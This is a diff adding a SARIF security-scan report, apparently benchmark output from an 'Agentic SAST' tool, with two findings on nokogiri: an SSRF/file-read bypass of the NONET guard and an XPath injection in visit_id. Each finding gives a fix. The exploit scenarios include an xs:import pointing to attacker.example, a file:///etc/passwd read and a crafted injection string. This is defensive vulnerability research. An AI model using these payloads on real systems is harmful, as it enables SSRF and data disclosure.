@@ -1,0 +1,174 @@
+{
+  "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Agentic SAST",
+          "version": "1.0.0",
+          "rules": [
+            {
+              "id": "CWE-918: Server-Side Request Forgery (SSRF)",
+              "name": "CWE-918: Server-Side Request Forgery (SSRF)",
+              "shortDescription": {
+                "text": "Server-Side Request Forgery (SSRF)"
+              }
+            },
+            {
+              "id": "CWE-643: Improper Neutralization of Data within XPath Expressions (XPath Injection)",
+              "name": "CWE-643: Improper Neutralization of Data within XPath Expressions (XPath Injection)",
+              "shortDescription": {
+                "text": "Improper Neutralization of Data within XPath Expressions (XPath Injection)"
+              }
+            }
+          ],
+          "supportedTaxonomies": [
+            {
+              "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+            }
+          ]
+        }
+      },
+      "taxonomies": [
+        {
+          "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3",
+          "name": "CWE",
+          "organization": "MITRE",
+          "shortDescription": {
+            "text": "The MITRE Common Weakness Enumeration"
+          },
+          "informationUri": "https://cwe.mitre.org/",
+          "taxa": [
+            {
+              "id": "CWE-643",
+              "helpUri": "https://cwe.mitre.org/data/definitions/643.html",
+              "name": "Improper Neutralization of Data within XPath Expressions (XPath Injection)",
+              "shortDescription": {
+                "text": "Improper Neutralization of Data within XPath Expressions (XPath Injection)"
+              }
+            },
+            {
+              "id": "CWE-918",
+              "helpUri": "https://cwe.mitre.org/data/definitions/918.html",
+              "name": "Server-Side Request Forgery (SSRF)",
+              "shortDescription": {
+                "text": "Server-Side Request Forgery (SSRF)"
+              }
+            }
+          ]
+        }
+      ],
+      "properties": {
+        "applicationId": "bench-nokogiri",
+        "scanDegraded": false,
+        "unrankedFallback": false
+      },
+      "results": [
+        {
+          "ruleId": "CWE-918: Server-Side Request Forgery (SSRF)",
+          "level": "warning",
+          "message": {
+            "text": "NONET schema guard only blocks http/ftp, not https/file/jar  [CVSS 5.8: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "ext/java/nokogiri/XmlSchema.java"
+                },
+                "region": {
+                  "startLine": 292
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "medium",
+            "security-severity": "5.8",
+            "cvssRating": "Medium",
+            "category": "CWE-918: Server-Side Request Forgery (SSRF)",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N",
+            "cwe": "CWE-918 - Server-Side Request Forgery (SSRF)",
+            "cweId": "CWE-918",
+            "cweName": "Server-Side Request Forgery (SSRF)",
+            "cvssScore": 5.8,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.6,
+            "description": "#### Description\ncreateSchemaInstance() builds a SchemaResourceResolver using `noNet` derived from the caller-supplied parse options (XmlSchema.java:77,80-81). During schema parsing, the XML library calls resolveResource() with `systemId`/`baseURI` taken directly from the attacker-controlled schema document (e.g. an <xs:import schemaLocation=...> or external entity). The network-blocking branch at line 292 fires only when `systemId.startsWith(\"http://\") || systemId.startsWith(\"ftp://\")`. Any other scheme \u2014 https://, file://, jar:, ftps:// \u2014 falls into the else branch (line 300-305) where adjustSystemIdIfNecessary() is called and the systemId is set on `lsInput`, causing the resource to be loaded. Thus the NONET protection is incomplete and bypassable simply by using an https:// (or file://) URL inside the schema.\n\n#### Impact\nWhen an application parses an attacker-supplied XML Schema (or RelaxNG) with the NONET option set to forbid network access, the resolver still resolves systemIds that use https://, file://, jar:, etc. An attacker can therefore make the validator fetch a remote schema over HTTPS (SSRF) or read a local file (XXE-style disclosure) despite NONET being requested.\n\n#### Exploit scenario\nAn application validates user data against a user-provided XSD with NONET set, calling Schema.from_document on the attacker's schema. The schema contains `<xs:import namespace=\"x\" schemaLocation=\"https://attacker.example/track.xsd\"/>` or `schemaLocation=\"file:///etc/passwd\"`. resolveResource() skips the http/ftp guard, sets the systemId on the LSInput, and the parser fetches the URL \u2014 yielding SSRF (HTTPS callback / internal endpoint probe) or local-file inclusion even though network access was supposed to be disabled.\n\n#### Preconditions\n- Application validates against an attacker-influenced XML Schema / RelaxNG document\n- NONET parse option is relied upon to prevent network/external access\n\n```\nif (noNet && systemId != null && (systemId.startsWith(\"http://\") || systemId.startsWith(\"ftp://\"))) {\n  if (systemId.startsWith(XMLConstants.W3C_XML_SCHEMA_NS_URI)) {\n    return null; // use default resolver\n  }\n  try {\n    this.errorHandler.warning(new SAXParseException(String.format(\"Attempt to load network entity '%s'\", systemId), null));\n  } catch (SAXException ignored) {\n  }\n} else {\n  String adjusted = adjustSystemIdIfNecessary(currentDir, scriptFileName, baseURI, systemId);\n  lsInput.setPublicId(publicId);\n  lsInput.setSystemId(adjusted != null ? adjusted : systemId);\n  lsInput.setBaseURI(baseURI);\n}\n```\n\n#### How to fix\nThe network/external-resource guard must cover all non-local and remote schemes, not just http/ftp. In resolveResource() (XmlSchema.java:292) replace the literal `http://`/`ftp://` prefix test with a scheme allow-list (or block-list including https, file, jar, ftps, etc.), and when noNet is set refuse to resolve any absolute external systemId rather than falling through to set it on lsInput.\n\n**Exploitability:** CVSS 6.8 (Medium band, S:C/C:L). Pre-auth reachable but requires multiple realistic preconditions: app runs on JRuby, parses an attacker-controlled XML Schema, and relies on the noNet/NONET option for protection (the bug only matters if NONET is expected to block loads). Primitive is a confidentiality leak (file:// local read, https/jar SSRF) with no write or code execution \u2014 incomplete deny-list scheme filter. Blast radius is files/internal endpoints reachable by the process, scope-changed but C:L only. Settling at Medium per the CVSS band and the stacked preconditions.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 8/10) \u2014 NONET guard checks only http/ftp prefixes; https/file/jar schemes in an attacker-supplied schema's xs:import bypass it, yielding SSRF/forced local-file load despite NONET being set.\n\n**Analysis**\n\n**A. The sink (XmlSchema.java:292-305)** \u2014 verified verbatim against the file. The scanner read it correctly. The network guard fires *only* for `systemId.startsWith(\u2026"
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-918"
+            }
+          ],
+          "rank": 58.0
+        },
+        {
+          "ruleId": "CWE-643: Improper Neutralization of Data within XPath Expressions (XPath Injection)",
+          "level": "warning",
+          "message": {
+            "text": "Unescaped CSS id interpolated into XPath string literal  [CVSS 5.3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "lib/nokogiri/css/xpath_visitor.rb"
+                },
+                "region": {
+                  "startLine": 170
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "medium",
+            "security-severity": "5.3",
+            "cvssRating": "Medium",
+            "category": "CWE-643: Improper Neutralization of Data within XPath Expressions (XPath Injection)",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+            "cwe": "CWE-643 - Improper Neutralization of Data within XPath Expressions (XPath Injection)",
+            "cweId": "CWE-643",
+            "cweName": "Improper Neutralization of Data within XPath Expressions (XPath Injection)",
+            "cvssScore": 5.3,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.6,
+            "description": "#### Description\nvisit_id matches the id fragment with /^#(.*)$/ and interpolates the captured group directly into \"@id='...'\" with no escaping. The id value reaching this visitor has already passed through unescape_css_identifier (parser.rb _reduce_64, line 694), which turns CSS escape sequences such as \\27 or \\' into a literal single quote. A single quote in the id therefore terminates the XPath string literal and lets attacker text be parsed as XPath. Unlike visit_attribute_condition (lines 179-188) which deliberately neutralizes embedded quotes with a concat() construction, visit_id performs no quoting at all. The resulting XPath string is handed verbatim to xmlXPathEvalExpression via noko_xml_xpath_context_evaluate (xml_xpath_context.c:379-395).\n\n#### Impact\nAn application that builds a CSS selector from untrusted input (e.g. doc.css(\"#\" + user_id)) gets XPath injection: the id value is dropped raw into a single-quoted XPath literal. An attacker can break out of the literal and change which nodes the query returns, bypassing an intended element filter or forcing a query error.\n\n#### Exploit scenario\nAn app does doc.css(\"#\" + params[:anchor]). Attacker sends anchor = \"x\\27]|//user[secret/text()=\\27\" which unescapes to id text x']|//user[secret/text()='. visit_id emits @id='x']|//user[secret/text()='', producing a valid injected XPath union that selects nodes outside the intended scope. The attacker thereby reads or matches document nodes the query was never meant to expose.\n\n#### Preconditions\n- Application concatenates untrusted data into a CSS id selector passed to css()/search()\n- Attacker can include CSS escape sequences (e.g. \\27) in that data\n\n```\ndef visit_id(node)\n  node.value.first =~ /^#(.*)$/\n  \"@id='#{Regexp.last_match(1)}'\"\nend\n```\n\n#### How to fix\nvisit_id must emit the id value as a properly quoted XPath literal. Apply the same quote-neutralizing logic used in visit_attribute_condition (or a shared helper that wraps values in concat() when they contain quote characters) at xpath_visitor.rb:172 instead of bare single-quote interpolation.\n\n**Exploitability:** CVSS 5.3 (Medium band, S:U/C:L). Query-injection: an unescaped CSS id is interpolated into an XPath string literal, letting a single quote (decoded by unescape_css_identifier) break out and inject XPath. Precondition: the application must pass an attacker-controlled CSS selector string into a .css()/at_css() query \u2014 uncommon but plausible. Primitive is parsed-document-integrity subversion (returns unintended nodes), not memory corruption or auth bypass; impact is bounded to fooling downstream filtering/sanitization logic. No info leak beyond document contents already in scope. Medium per CVSS band; would be Low on impact alone but anchored to the band.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 8/10) \u2014 unescaped id with literal-quote injected verbatim into the `@id='...'` XPath literal; full path from `css()` to sink confirmed, no escaping anywhere unlike `visit_attribute_condition`. Impact confined to the queried document (read-only), hence limited confidentiality.\n\nI have confirmed the full chain in the actual source. Let me verify my findings:\n\n**A. The sink (xpath_visitor.rb:170-173)** \u2014 Confirmed verbatim:\n```ruby\ndef visit_id(node)\n  node.value.first =~ /^#(.*)$/\n  \"@id='#{Regexp.last_match(1)}'\"\nend\n```\nNo escaping, no quote neutralization. Contrast with `visit_attribute_condition` (lines 182-188) which builds a `concat()` when the value contains its own quote char \u2014 `visit_id` does nothing equivalent.\n\n**B. The unescaping claim** \u2014 Confirmed. `parser.rb` `_reduce_64` (line 694) builds the `:ID` node via `unescape_css_identifier(val[0])`. That function (line 26-28):\n```ruby\nidentifier.gsub(/\\\\(?:([^0-9a-fA-F])|([0-9a-fA-F]{1,6})\\s?)/){ |m| $1 || [$2.hex].pack('U') }\n```\nSo `\\27` \u2192 `[0x27].pack('U')` \u2192 literal `'`. Special chars like `]`, `|`, `/`, `[`, `(` can all be smuggled as hex escapes (`\\5d`, `\\7c`, `\\2f`, \u2026), and \u2026"
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-643"
+            }
+          ],
+          "rank": 53.0
+        }
+      ],
+      "invocations": [
+        {
+          "executionSuccessful": true,
+          "toolExecutionNotifications": [
+            {
+              "level": "warning",
+              "message": {
+                "text": "s4: 5 recoverable error(s) logged"
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
